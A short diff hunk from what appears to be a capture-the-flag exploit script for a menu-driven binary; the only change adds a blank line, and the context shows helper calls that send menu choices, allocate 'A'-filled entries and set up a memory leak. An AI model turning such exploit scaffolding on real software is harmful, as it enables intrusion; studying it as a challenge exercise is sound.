@@ -31,6 +31,7 @@ def manage_for_leak(index):
   s.send('3\n')
   s.recvuntil('>')
   s.send(str(index)+'\n')
+
 apart('A'*8,1234,1234,'AAAA')
 apart('A'*8,1234,1234,'AAAA')
 manage_change(1,1,2)
